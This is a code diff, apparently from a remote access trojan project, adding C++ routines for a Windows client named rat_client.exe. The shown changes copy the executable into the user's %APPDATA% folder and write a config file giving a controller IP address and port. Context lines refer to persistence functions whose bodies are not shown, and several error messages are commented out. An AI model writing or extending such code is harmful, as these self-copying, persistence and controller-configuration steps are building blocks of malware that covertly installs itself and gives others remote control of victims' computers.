@@ -1,6 +1,25 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
+#include <fstream>
+#include <filesystem>
+#include <cstdlib>
+#include <system_error>
+
+
+std::filesystem::path getAppDataPath() {
+    const char* appdata = std::getenv("APPDATA");
+    if (!appdata) {
+        // std::cerr << "Error: APPDATA no encontrada.\n";
+        return {};
+    }
+    return std::filesystem::path(appdata);
+}
+
+bool fileExist(const std::filesystem::path& file_path) {
+    std::error_code ec;
+    return std::filesystem::exists(file_path, ec) && std::filesystem::is_regular_file(file_path, ec);
+}
 
 bool persistence(const std::wstring& valueName, const std::wstring& path) {
     // Function to apply persistence
@@ -69,34 +88,92 @@ bool checkPersistence(const std::wstring& valueName) {
 }
 
 //Copiar ejecutable en %APPDATA%
-int copyexe() {
-    // 1) Obtener ruta del ejecutable actual
-    char exePath[MAX_PATH];                        // buffer para la ruta
-    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    if (len == 0) {
-        std::cerr << "Error: no se pudo obtener la ruta del exe.\n";
-        return 1;
+bool copyExe(const std::filesystem::path& sourceFile, const std::filesystem::path& destFolder) {
+    try {
+        // Create parent directories if does not exist
+        std::error_code ec;
+        if (!std::filesystem::exists(destFolder)) {
+            if (!std::filesystem::create_directories(destFolder, ec)) {
+                std::cerr << "No se pudo crear la carpeta destino: " << ec.message() << "\n";
+                return false;
+            }
+        }
+
+        // build destination file path
+        std::filesystem::path destFile = destFolder / "rat_client.exe";
+
+        // Copy file
+        std::filesystem::copy_file(sourceFile, destFile, std::filesystem::copy_options::overwrite_existing, ec);
+        if (ec) {
+            std::cerr << "Error al copiar el archivo: " << ec.message() << "\n";
+            return false;
+        }
+
+        return true;
+    } catch (const std::exception& ex) {
+        std::cerr << "Excepcion al copiar el archivo: " << ex.what() << "\n";
+        return false;
+
     }
 
-    // 2) Obtener carpeta AppData desde la variable de entorno %APPDATA%
-    const char* appdata = std::getenv("APPDATA");
-    if (!appdata) {                               // si no existe la variable
-        std::cerr << "Error: APPDATA no encontrada.\n";
-        return 1;
-    }
-
-    // 3) Construir ruta destino (AppData\\NombreTemporal.exe)
-    std::string destino = std::string(appdata) + "\\NombreTemporal.exe";
-
-    // 4) Copiar el archivo (origen = exePath, destino = destino.c_str())
-    if (CopyFileA(exePath, destino.c_str(), FALSE)) {
-        std::cout << "Copiado correctamente a: " << destino << "\n";
-    }
-    else {
-        std::cerr << "Error al copiar (codigo): " << GetLastError() << "\n";
-        return 1;
-    }
-
-    return 0;
 }
 
+bool createConfigFile(const std::filesystem::path& file_path) {
+    try {
+        std::string defaultContent =
+            "Defaul configuration for rat_client.exe\n"
+            "ip_address=127.0.0.1\n"
+            "port=8888\n";
+
+        // Create parent directories if does not exist
+        if (file_path.has_parent_path()) {
+            std::filesystem::path parent = file_path.parent_path();
+            std::error_code ec;
+            std::filesystem::create_directories(parent, ec);
+            if (ec) {
+                //std::cerr << "Could not create parent directories: " << ec.message() << std::endl;
+                return false;
+            }
+        }
+
+        // temporal path
+        std::filesystem::path tmp = file_path;
+        tmp += ".tmp";
+
+        // Write in temporal path
+        {
+            std::ofstream ofs(tmp, std::ios::binary | std::ios::trunc);
+            if (!ofs) {
+                //std::cerr << "Error: Could not open temporal file to write: " << tmp << "\n";
+                return false;
+            }
+            ofs << defaultContent;
+            ofs.flush();
+
+            if (!ofs) {
+                //std::cerr << "Error: Could not write in temporal file: " << tmp << "\n";
+                std::error_code ec;
+                std::filesystem::remove(tmp, ec);
+                return false;
+            }
+        }
+
+        // Rename (move) tmp -> dest
+        std::error_code ec;
+        std::filesystem::rename(tmp, file_path, ec);
+        if (ec) {
+            std::filesystem::copy_file(tmp, file_path, std::filesystem::copy_options::overwrite_existing, ec);
+            if (ec) {
+                //std::cerr << "Could not move temporal file to dest: " << ec.message() << "\n";
+                std::filesystem::remove(tmp, ec);
+                return false;
+            }
+            std::filesystem::remove(tmp, ec);
+        }
+        return fileExist(file_path);
+
+    } catch (const std::exception& ex) {
+        //std::cerr << "Exception: createConfigFile: " << ex.what() << "\n";
+        return false;
+    }
+}
